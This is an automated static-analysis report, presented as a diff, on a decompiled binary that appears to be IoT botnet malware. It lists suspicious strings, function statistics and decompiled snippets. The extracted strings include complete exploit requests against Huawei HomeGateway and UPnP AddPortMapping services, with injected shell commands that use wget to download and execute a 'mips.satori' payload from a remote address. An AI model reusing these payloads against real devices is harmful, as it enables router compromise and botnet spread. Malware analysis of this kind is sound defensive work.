@@ -1,0 +1,866 @@
+=============================================================================
+========	BINARY ID :2cbf8930f4bcdc79bcf076fabfda7dfbc3ff8ad7==================================================
+================================================================================
+================================================================================
+========	STRINGS SUMMARY : =====================================================
+================================================================================
+TOTAL STRINGS COUNT :207
+SUPSCPECTED LINES COUNT :6
+SUPSCPECTED STRINGS COUNT (DISTINCT) :8
+SUPSCPECTED STRINGS WEIGHT :33
+SUSPECT STRING SCORE : [33 / 150] 22%
+USER AGENTS STRINGS COUNT :3
+STATIC IPs STRINGS COUNT :0
+DYNAMIC IPs STRINGS COUNT :0
+================================================================================
+========	STRINGS DETAILS : =====================================================
+================================================================================
+================================================================================
+========	SUSPECTED STRINGS : =====================================================
+================================================================================
+%29 HTTP/1.0\r\n\r\n
+ HTTP/1.0\r\n\r\n
+POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: 127.0.0.1:37215\r\nUser-Agent: Hello-World\r\nContent-Length: 413\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Digest username="dslf-config", realm="HuaweiHomeGateway", nonce="88645cefb1f9ede0e336e3569d75ee30", uri="/ctrlt/DeviceUpgrade_1", response="3612f843a42db38f48f59d2a3597e19c", algorithm="MD5", qop="auth", nc=00000001, cnonce="248d1a2560100669"\r\n\r\n<?xml version="1.0" ?>\r\n    <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n    <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">\r\n    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\r\n<NewDownloadURL></NewDownloadURL>\r\n</u:Upgrade>\r\n    </s:Body>\r\n    </s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 642\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+================================================================================
+========	USER AGENTS STRINGS : =====================================================
+================================================================================
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 642\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+================================================================================
+========	STATIC IP ADRESSES : =====================================================
+================================================================================
+================================================================================
+========	DYNAMIC IP MASKS : =====================================================
+================================================================================
+================================================================================
+========	/proc FOLDER ACCESS : =====================================================
+================================================================================
+================================================================================
+========	HISTORY TEMPERING : =====================================================
+================================================================================
+================================================================================
+========	AUTOINSTALL COMMANDS : =====================================================
+================================================================================
+================================================================================
+========	FUNCTIONS SUMMARY : =====================================================
+================================================================================
++++TOTAL FILE LINES			: 39751
++++TOTAL FUNCTIONS 			:128
++++LINES PER FUNCTION RATIO 	: 310.5546875
++++SUSPECTED LINES COUNT 	: 177
++++SUSPECTED LINES RATIO 	: 0.445271817061206
+================================================================================
+========	WHILES SUMMARY : =====================================================
+================================================================================
++++TOTAL FILE LINES				: 39751
++++WHILE (TRUE) LINES			: 3190
++++WHILE (TRUE) LINES RATION		:8.0249553470353%
++++WHILE (TRUE) LOOPS COUNT		: 34
+================================================================================
+========	SYSTEM FILES SUMMARY : ================================================
+================================================================================
+                                                                                function_404b90(v348, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", v355);
+                                                                                    function_404b90(v347, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", v364);
+                                                                                    function_404b90(v347, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 642\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", 185);
+                                                                                            function_404b90(v383, (int32_t)"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: 127.0.0.1:37215\r\nUser-Agent: Hello-World\r\nContent-Length: 413\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?>\r\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\r\n    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\r\n<NewDownloadURL></NewDownloadURL>\r\n</u:Upgrade>\r\n    </s:Body>\r\n    </s:Envelope>\r\n\r\n", 185);
+    int32_t v251 = function_405070("/dev/null"); // 0x406ec4
+================================================================================
+========	IP PATTERNS SUMMARY : =================================================
+================================================================================
+                                                                                            function_404b90(v383, (int32_t)"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: 127.0.0.1:37215\r\nUser-Agent: Hello-World\r\nContent-Length: 413\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?>\r\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\r\n    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\r\n<NewDownloadURL></NewDownloadURL>\r\n</u:Upgrade>\r\n    </s:Body>\r\n    </s:Envelope>\r\n\r\n", 185);
+
+================================================================================
+========	SYSTEM CALLS SUMMARY : ================================================
+================================================================================
+================================================================================
+========	FUNCTIONS LIST : =======================================================
+================================================================================
+FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
+----------------------------------------------------------------------------------------------
+function_404288                                   |1   |632     |75            |379         |
+----------------------------------------------------------------------------------------------
+function_4028e8                                   |1   |1350    |17            |657         |
+----------------------------------------------------------------------------------------------
+function_401f28                                   |1   |954     |9             |691         |
+----------------------------------------------------------------------------------------------
+function_4058c0                                   |3   |564     |6             |22          |
+----------------------------------------------------------------------------------------------
+function_400a30                                   |1   |592     |5             |270         |
+----------------------------------------------------------------------------------------------
+function_401304                                   |0   |351     |5             |0           |
+----------------------------------------------------------------------------------------------
+function_404660                                   |4   |409     |3             |102         |
+----------------------------------------------------------------------------------------------
+function_401520                                   |1   |522     |3             |195         |
+----------------------------------------------------------------------------------------------
+function_40405c                                   |2   |433     |3             |84          |
+----------------------------------------------------------------------------------------------
+function_4047b0                                   |5   |353     |2             |55          |
+----------------------------------------------------------------------------------------------
+function_405f30                                   |5   |263     |2             |0           |
+----------------------------------------------------------------------------------------------
+function_4002d0                                   |1   |317     |2             |58          |
+----------------------------------------------------------------------------------------------
+function_403d2c                                   |2   |337     |2             |79          |
+----------------------------------------------------------------------------------------------
+function_400418                                   |1   |319     |2             |61          |
+----------------------------------------------------------------------------------------------
+function_405bf0                                   |5   |263     |2             |0           |
+----------------------------------------------------------------------------------------------
+function_406010                                   |3   |264     |2             |0           |
+----------------------------------------------------------------------------------------------
+function_405e50                                   |5   |263     |2             |0           |
+----------------------------------------------------------------------------------------------
+function_405eb0                                   |6   |263     |2             |0           |
+----------------------------------------------------------------------------------------------
+function_40450c                                   |0   |267     |2             |0           |
+----------------------------------------------------------------------------------------------
+function_406640                                   |2   |304     |1             |38          |
+----------------------------------------------------------------------------------------------
+function_404be4                                   |2   |311     |1             |44          |
+----------------------------------------------------------------------------------------------
+function_407960                                   |0   |264     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_40413c                                   |3   |298     |1             |16          |
+----------------------------------------------------------------------------------------------
+function_405cb0                                   |3   |266     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_404ef0                                   |0   |264     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_4056a0                                   |1   |293     |1             |31          |
+----------------------------------------------------------------------------------------------
+function_404f50                                   |0   |264     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_4024d4                                   |1   |291     |1             |27          |
+----------------------------------------------------------------------------------------------
+function_405d70                                   |3   |265     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_4043f4                                   |3   |301     |1             |46          |
+----------------------------------------------------------------------------------------------
+function_407490                                   |3   |264     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_405c50                                   |4   |264     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_407810                                   |0   |264     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_400564                                   |1   |271     |1             |15          |
+----------------------------------------------------------------------------------------------
+function_4078d0                                   |0   |264     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_405d10                                   |4   |264     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_404920                                   |3   |414     |1             |144         |
+----------------------------------------------------------------------------------------------
+function_405070                                   |1   |270     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_405df0                                   |2   |264     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_404fb0                                   |3   |264     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_404de0                                   |1   |264     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_405010                                   |2   |264     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_404228                                   |4   |290     |1             |28          |
+----------------------------------------------------------------------------------------------
+function_407870                                   |0   |264     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_407b60                                   |4   |278     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_406f88                                   |7   |591     |1             |18          |
+----------------------------------------------------------------------------------------------
+function_407640                                   |0   |317     |1             |39          |
+----------------------------------------------------------------------------------------------
+function_407ea0                                   |0   |513     |1             |91          |
+----------------------------------------------------------------------------------------------
+function_404e40                                   |0   |264     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_405f90                                   |5   |263     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_4082f0                                   |0   |256     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4081c0                                   |1   |260     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4063f0                                   |2   |295     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4053d0                                   |1   |270     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4073e0                                   |5   |263     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_405170                                   |4   |263     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4064b0                                   |1   |323     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_407c00                                   |2   |264     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4052b0                                   |1   |264     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4050ec                                   |1   |253     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_407c60                                   |2   |255     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4068c0                                   |1   |273     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4057a0                                   |0   |253     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_404c80                                   |0   |273     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_401e78                                   |0   |254     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4045f4                                   |2   |259     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4051d0                                   |3   |263     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_406700                                   |4   |265     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4074f0                                   |2   |267     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_403f6c                                   |2   |274     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_407d80                                   |2   |255     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_403f4c                                   |0   |263     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_403fa4                                   |0   |269     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_405110                                   |3   |264     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_406170                                   |2   |254     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4044ac                                   |0   |253     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_405310                                   |1   |264     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_406e64                                   |1   |253     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_406da0                                   |0   |282     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_406e74                                   |2   |267     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_407fe0                                   |0   |435     |0             |0           |
+----------------------------------------------------------------------------------------------
+unknown_0                                         |0   |0       |0             |0           |
+----------------------------------------------------------------------------------------------
+function_404ea0                                   |0   |259     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_405830                                   |3   |384     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_402640                                   |2   |295     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_403d0c                                   |0   |253     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_40061c                                   |3   |255     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4001dc                                   |0   |268     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_402868                                   |2   |263     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_402780                                   |2   |253     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_404d80                                   |1   |264     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_406bf0                                   |1   |268     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4005c0                                   |0   |253     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4006d0                                   |0   |285     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_408230                                   |1   |272     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_408190                                   |1   |253     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_401d68                                   |0   |259     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_406198                                   |2   |255     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_404030                                   |3   |269     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4079c0                                   |2   |258     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_406748                                   |3   |368     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4061c4                                   |2   |255     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_407580                                   |3   |280     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_40672c                                   |3   |260     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_403f48                                   |0   |254     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_404d10                                   |0   |264     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_405370                                   |2   |266     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_406efc                                   |0   |274     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_403fcc                                   |2   |266     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_406070                                   |2   |336     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_405500                                   |0   |342     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_400094                                   |0   |256     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_405250                                   |0   |264     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4072f0                                   |3   |272     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_403fa0                                   |3   |254     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_401dc4                                   |2   |266     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4069b0                                   |1   |337     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_407ad0                                   |1   |304     |0             |0           |
+----------------------------------------------------------------------------------------------
+entry_point                                       |1   |256     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4057c0                                   |0   |255     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_407930                                   |1   |253     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_407a70                                   |4   |263     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_406e6c                                   |2   |254     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_407440                                   |1   |254     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_400120                                   |0   |293     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_4027d4                                   |2   |273     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_404b90                                   |3   |253     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_406200                                   |1   |336     |0             |0           |
+----------------------------------------------------------------------------------------------
+================================================================================
+========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
+================================================================================
+=================FUNCTION : function_404288 ===================
+++++++++ FUNCTION START 12559
+++++++++ FUNCTION END 13191
+++++++++ FUNCTION LENGTH 632
+    while (true) {
+            case 32: {
+                while (true) {
+                        case 32: {
+                            while (true) {
+                                    case 32: {
+                                        while (true) {
+                                                case 32: {
+                                                    while (true) {
+                                                            case 32: {
+                                                                while (true) {
+                                                                        case 32: {
+                                                                            while (true) {
+                                                                                    case 32: {
+                                                                                        while (true) {
+                                                                                                case 32: {
+                                                                                                    while (true) {
+                                                                                                            case 32: {
+                                                                                                                while (true) {
+                                                                                                                        case 32: {
+                                                                                                                            while (true) {
+                                                                                                                                    case 32: {
+                                                                                                                                        while (true) {
+                                                                                                                                                case 32: {
+                                                                                                                                                    while (true) {
+                                                                                                                                                            case 32: {
+                                                                                                                                                                while (true) {
+                                                                                                                                                                        case 32: {
+                                                                                                                                                                            while (true) {
+                                                                                                                                                                                    case 32: {
+                                                                                                                                                                                        while (true) {
+                                                                                                                                                                                                case 32: {
+                                                                                                                                                                                                    while (true) {
+                                                                                                                                                                                                            case 32: {
+                                                                                                                                                                                                                while (true) {
+                                                                                                                                                                                                                        case 32: {
+                                                                                                                                                                                                                            while (true) {
+                                                                                                                                                                                                                                    case 32: {
+                                                                                                                                                                                                                                        while (true) {
+                                                                                                                                                                                                                                                case 32: {
+                                                                                                                                                                                                                                                    while (true) {
+                                                                                                                                                                                                                                                            case 32: {
+                                                                                                                                                                                                                                                                while (true) {
+                                                                                                                                                                                                                                                                        case 32: {
+                                                                                                                                                                                                                                                                            while (true) {
+                                                                                                                                                                                                                                                                                    case 32: {
+                                                                                                                                                                                                                                                                                        while (true) {
+                                                                                                                                                                                                                                                                                                case 32: {
+                                                                                                                                                                                                                                                                                                    while (true) {
+                                                                                                                                                                                                                                                                                                            case 32: {
+                                                                                                                                                                                                                                                                                                            case 9: {
+                                                                                                                                                                                                                                                                                                case 9: {
+                                                                                                                                                                                                                                                                                    case 9: {
+                                                                                                                                                                                                                                                                        case 9: {
+                                                                                                                                                                                                                                                            case 9: {
+                                                                                                                                                                                                                                                case 9: {
+                                                                                                                                                                                                                                    case 9: {
+                                                                                                                                                                                                                        case 9: {
+                                                                                                                                                                                                            case 9: {
+                                                                                                                                                                                                case 9: {
+                                                                                                                                                                                    case 9: {
+                                                                                                                                                                        case 9: {
+                                                                                                                                                            case 9: {
+                                                                                                                                                case 9: {
+                                                                                                                                    case 9: {
+                                                                                                                        case 9: {
+                                                                                                            case 9: {
+                                                                                                case 9: {
+                                                                                    case 9: {
+                                                                        case 9: {
+                                                            case 9: {
+                                                case 9: {
+                                    case 9: {
+                        case 9: {
+            case 9: {
+=================FUNCTION : function_4028e8 ===================
+++++++++ FUNCTION START 7627
+++++++++ FUNCTION END 8977
+++++++++ FUNCTION LENGTH 1350
+                        while (true) {
+                                    if (function_405cb0(v315, (struct sockaddr *)&v312) == -1) {
+                                            while (true) {
+                                                                                function_404b90(v348, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", v355);
